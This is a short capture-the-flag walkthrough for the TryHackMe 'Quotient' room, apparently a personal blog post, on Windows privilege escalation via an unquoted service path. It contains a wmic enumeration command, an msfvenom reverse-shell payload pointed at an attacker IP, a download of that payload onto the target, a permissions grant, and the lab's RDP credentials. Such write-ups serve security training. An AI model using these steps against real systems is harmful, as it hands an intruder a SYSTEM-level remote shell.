---

title: Walkthrough - Quotient
published: true
---

Tags: Security, Windows, Privilege Escalation, Unquoted Path.
Description: Grammar is important. Don't believe me? Just see what happens when you forget punctuation.
Difficulty: Easy
URL: [https://tryhackme.com/room/quotient](https://tryhackme.com/room/quotient)

* * *

## Notes

> Grammar is important. Don't believe me? Just see what happens when you forget punctuation. Access the machine using RDP with the following credentials:
> Creds: sage:gr33ntHEphgK2&V

Unquoted service path! If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

To list unquoted service paths:

- `wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """`

This command shows us this unquoted service path

```
Developmenet Service                                                                Development Service                       C:\Program Files\Development Files\Devservice Files\Service.exe                    Auto
```

So if we create a executable and get it into the program files folder we can get it to send us back a reverse shell as system.

- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.127.225 LPORT=6666 -f exe-service -o service.exe`

1. setup python webserver and `PS C:\Users\Sage> Invoke-WebRequest -Uri "http://10.2.127.225/Service.exe" -OutFile "Service.exe"` on the target machine.
2. Give everyone permissions `icacls C:\Users\Sage\Service.exe /grant Everyone:F`
3. Copy the service.exe to the Development Files directory and rename Devservice.exe.

![0xskar](/assets/quotient01.png)

We dont have permissions to start and stop the service but a restart of the system will do this, and should send us a shell.

* * * 

## Admin Flag

![0xskar](/assets/quotient02.png)

* * * 

